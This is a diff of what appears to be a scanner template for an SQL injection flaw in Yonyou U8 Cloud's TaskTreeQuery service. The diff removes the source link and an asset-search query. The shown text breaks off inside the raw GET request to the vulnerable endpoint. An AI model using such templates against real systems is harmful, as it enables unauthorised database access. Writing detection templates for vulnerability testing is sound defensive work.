@@ -3,14 +3,8 @@ info:
   name: 用友U8CloudTaskTreeQuery存在SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fdff25961ed830728facd944f59cd37c
-
-    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fdff25961ed830728facd944f59cd37c
-    fofa: + hunter`app.name="用友 U8 Cloud"`
 http:
 - raw:
   - 'GET /service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=211 HTTP/1.1
